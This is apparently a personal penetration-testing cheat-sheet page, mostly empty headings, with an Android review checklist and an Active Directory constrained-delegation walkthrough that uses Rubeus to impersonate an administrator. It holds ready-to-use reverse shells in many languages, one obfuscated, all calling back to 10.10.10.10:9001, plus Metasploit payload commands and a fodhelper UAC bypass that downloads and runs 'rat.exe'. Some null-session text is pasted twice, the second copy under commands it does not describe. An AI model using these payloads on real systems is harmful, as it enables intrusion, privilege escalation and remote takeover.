---
layout: page
title: "/brainbox"
permalink: /brainbox/
---

# INFASTRUCTURE

<details><summary> <b>API</b> </summary><blockquote>
  <details><summary>REST</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>SOAP</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>


<details><summary> <b>WEB</b> </summary><blockquote>
    <br/>
Start with automated tools to search for low hanging fruits 
   Burpsuite Scanner
   OWASP Zap 
   Accunetix
   Nikto 
   
   
  <details><summary>SQLi</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>SSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>IDOR</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>XSS</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>BAC</summary><blockquote>
        Broken Access Control
    :smile:
  </blockquote></details>
    <details><summary>XXE</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>SDE</summary><blockquote>
        secure data exposure
    :smile:
  </blockquote></details>
    <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>CSRF</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>MOBILE</b> </summary><blockquote>
  <details><summary>Android</summary><blockquote>
    ### Checklist
* unzip -d and apktool -d both (different outputs at time)
    
* check for /assets and /res/raw (api keys, encryption keys)
    
* sensitive files and external storage (world readable  & writeable)
    
* executables & log files on external storage
    
* look at manifest (WRITE_EXTERNAL_STORAGE)., grep for "getExternal"
    
* check for installed package "vnd.android.package-archive" (they want to install something)
    
* hidden directories (.folder)
    
* api keys saved as bytearray to obfuscate
    
* identify crypto & understand it
    
* webSettings.setJavaScriptEnabled(True); means we might be able to XSS
    
* interesting options: "setAllowContent", "setAllowFileAccess", "setAllowFileAccessFromFileURILS", "setAllowUniversalAccessFromFileURLs", "setJavaScriptEnabled", "setPluginState", "setSavePassword"
    
* overwriting ssl errors :facepalm:
    
* xss might allow to call Runtime.getRuntime().exec() (CVE-2012-6636) <= Api17
                                                                           
* use Mitm Proxy (mitm.it has the cert)
                                                                           
    :smile:
  </blockquote></details>
  <details><summary>iOS</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>*NIX</b> </summary><blockquote>
  <details><summary>Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>Privilege Escalation</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>Post Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>WINDOWS</b> </summary><blockquote>
  <details><summary>Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>Privilege Escalation</summary><blockquote>
    :smile:
  </blockquote></details>
    <details><summary>Post Exploitation</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>

<details><summary> <b>ACTIVE-DIRECTORY</b> </summary>
    <details><summary>Initial Access</summary>
        content 1.1
    </details>
    <details><summary>Local Privilege Escalation</summary>
        content 1.2
    </details>
  <details><summary>Post Exploitation</summary>
        content 1.2
    </details>
    <details><summary>Lateral Movement</summary>
        <details><summary>Constrained Delegation</summary>
       
          
          
          
          First off, download two PS scripts in local machine..

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
```

Then upload them to the target machine.

```bash
# Evil-WinRM
upload PowerView.ps1
Import-Module .\PowerView.ps1
upload Powermad.ps1
Import-Module .\Powermad.ps1
```

1. **Check User's Permission and Windows Versions**

    Check if users are allowed to create a new computer object on the domain.

    ```bash
    Get-DomainObject -Identity "dc=example,dc=com" -Domain example.com

    # -------------------------
    # Result
    ms-ds-machineaccountquota: 10
    ```

    And check if the machine is at least Windows Server 2012.

    ```bash
    Get-DomainController

    # -------------------------
    # Result
    OSVersion: Windows Server 2022 Standard
    ```

    Additionally, check if the target computer does not have the attributes **“msds-allowedtoactionbehalfofotheridentity”** set.

    ```bash
    hostname
    Get-NetComputer <hostname> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity

    # ------------------
    # Result
    name msds-allowedtoactonbehalfofotheridentity
    ---- ----------------------------------------
    <HOSTNAME>   {1, 0, 4, 128...}
    ```
      
    ```bash
      .\Rubeus.exe s4u /user:HOST$ /rc4:rc4ORntml /msdsspn:CIFS/host.domain.com /impersonateuser:administrator /ptt
      
       dir \\host.domain.com\C$
    ````  

2. **Create a New Computer**

    Now you can create a new computer object.

    ```bash
    New-MachineAccount -MachineAccount TEST01 -Password $(ConvertTo-SecureString '12345' -AsPlainText -Force)
    Get-DomainComputer test01

    # ----------------------
    # Result (copy the id)
    objectsid: S-1-5-21-1677581083-3380853377-188903654-5103
    ```

    Create a new raw security descriptor.

    ```bash
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<objectid-of-a-new-computer>)"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)
    Get-DomainComputer <hostname> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
    ```

3. **Impersonate to Get a Ticket**

    Download Rubeus.exe in local machine.

    ```bash
    wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
    ```

    Then upload it to the target machine and generate a RC4 hash.

    ```bash
    # Evil-WinRM
    upload Rubeus.exe
    .\Rubeus.exe hash /password:12345 /user:test01 /domain:example.com

    # -------------------------
    # Result (copy the rc4 hash)
    rc4_hmac: 32ED87BDB5FDC5E9CBA88547376818D4

    ```

    You can request a Kerberos ticket for a new machine account while impersonating an administrator.

    ```bash
    .\Rubeus.exe s4u /user:test01$ /rc4:<rc4-hash> /impersonateuser:administrator /msdsspn:cifs/<hostname>.example.com /ptt

    # --------------
    # Result (copy the output long hash at the last)
    ```

    Generate a ticket

    ```bash
    [IO.File]::WriteAllBytes("C:\Users\<username>\Documents\ticket.kirbi", [Convert]::FromBase64String("<new-output-hash>"))
    download ticket.kirbi
    ```

4. **Make the Ticket Usable and Use It**

    Download “ticket_converter.py”.

    ```bash
    wget https://raw.githubusercontent.com/zer1t0/ticket_converter/master/ticket_converter.py
    ```

    Destroy any tickets in local machine, and convert the ticket to Linux usable, then set the new ticket’s path.

    ```bash
    kdestroy
    python3 ticket_converter.py ticket.kirbi ticket.ccache
    export KRB5CCNAME=ticket.ccache
    ```

    We can use the ticket to get a shell.

    ```bash
    impacket-wmiexec example.com/administrator@<hostname>.example.com -no-pass -k
    ```
      
      
      
    </details>
    </details>
    <details><summary>Clearing Tracks</summary>
        content 1.2
    </details>
</details>

<br/>

<details><summary> <b>CLOUD</b> </summary><blockquote>
  <details><summary>AZURE</summary><blockquote>
    :smile:
  </blockquote></details>
  <details><summary>AWS</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>

<br/>
<details><summary> <b>SHELLS</b> </summary><blockquote>
  <details><summary>Reverse Shells</summary><blockquote>
#### Python
```python
  python -c 'import pty;pty.spawn("/bin/bash")';
```
    
#### Python
```python
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```
    
#### PHP
```php
    php -r '$sock=fsockopen("10.10.10.10",9001);system("sh <&3 >&3 2>&3");'
```
    
#### Bash
```bash
    sh -i >& /dev/tcp/10.10.10.10/9001 0>&1
 ```
    
#### PHP Emoji
```php
    php -r '$ð="1";$ð="2";$ð="3";$ð="4";$ð="5";$ð="6";$ð="7";$ð="8";$ð="9";$ð="0";$ð¤¢=" ";$ð¤="<";$ð¤ =">";$ð±="-";$ðµ="&";$ð¤©="i";$ð¤=".";$ð¤¨="/";$ð¥°="a";$ð="b";$ð¶="i";$ð="h";$ð="c";$ð¤£="d";$ð="e";$ð="f";$ð="k";$ð="n";$ð="o";$ð="p";$ð¤="s";$ð="x";$ð = $ð. $ð¤. $ð. $ð. $ð. $ð. $ð. $ð. $ð;$ð = "10.10.10.10";$ð» = 9001;$ð = "sh". $ð¤¢. $ð±. $ð¤©. $ð¤¢. $ð¤. $ðµ. $ð. $ð¤¢. $ð¤ . $ðµ. $ð. $ð¤¢. $ð. $ð¤ . $ðµ. $ð;$ð¤£ =  $ð($ð,$ð»);$ð½ = $ð. $ð. $ð. $ð;$ð½($ð);'
```
    
#### C
```c
    #include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 9001;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("10.10.10.10");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execve("sh", argv, NULL);

    return 0;       
}
```
    
#### Powershell
    
```powershell
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```

#### NodeJS
```javascript
    (function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(9001, "10.10.10.10", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```
    
    
    :smile:
  </blockquote></details>
  <details><summary>Web Shells</summary><blockquote>
    :smile:
  </blockquote></details>
</blockquote></details>


<br/>
<br/>

## Metasploit 
#### ./ Multi Use Handlers

```bash 
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD <Payload name>
msf6 > set LHOST <LHOST value>
msf6 > set LPORT <LPORT value>
msf6 > set ExitOnSession false
msf6 > exploit -j -z
```
<br/>
Once the required values are completed the following command will execute your handler: ‘msfconsole -L -r' 
<br/>
<br/>

#### ./ Scripting Payloads
PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp lhost=<your-IP-address> lport=<your-port-address> -o shell.php
```

<br/>

## Python
#### ./ Spawn a terminal

```python
python -c 'import pty;pty.spawn("/bin/bash")';
```
<details> 
  <summary> <b>Checking for Null Sessions</b> </summary>

To verify that, we will exploit the IPC$ administrative share by trying to connect to it without valid credentials.

To connect, you have to type the following command in a Windows shell:

```bash
> NET USE \\<target IP address>\IPC$ '' /u:''
```

This tells Windows to connect to the IPC$ share by using an empty password and an empty username!

Let's try the command on our target:

<br/>
<img src="/assets/images/pts_labs/null_sessions/checking11.png" height="50%" width="50%">
<br/>


The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$. For example, it does not work with C$:
  
Example:
<br/>
<img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%">
<br/>
You can also perform the very same checks by using smbclient:
  
  proxychains faketime -f +8h impacket-wmiexec -k -no-pass user@10.10.10.10
<br/>
<img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
</details>

  
  
  
  
  
  
  
  
  
  
  
  
  
  <details> 
  <summary> <b>UAC Bypass</b> </summary>
    
    
 https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper

```ps
https://tcm-sec.com/bypassing-defender-the-easy-way-fodhelper
iwr -Uri http://10.10.10.11/rat.exe -Outfile C:\rat.exe

New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell.exe -exec bypass -c C:\rat.exe" -Force

execute the binary
C:\Windows\System32\fodhelper.exe
```
    
<br/>
<img src="/assets/images/pts_labs/null_sessions/checking11.png" height="50%" width="50%">
<br/>


The previous command establishes a connection to the IPC$ administrative share without specifying a user; this is possible because our target host is vulnerable to null session attacks. This test only works with the IPC$. For example, it does not work with C$:
  
Example:
<br/>
<img src="/assets/images/pts_labs/null_sessions/checking12.png" height="60%" width="60%">
<br/>
You can also perform the very same checks by using smbclient:
    
    proxychains impacket-psexec -no-pass Administrator@10.10.10.10 -hashes :admin_hash>`
<br/>
<img src="/assets/images/pts_labs/null_sessions/checking13.png" height="70%" width="70%">
</details>
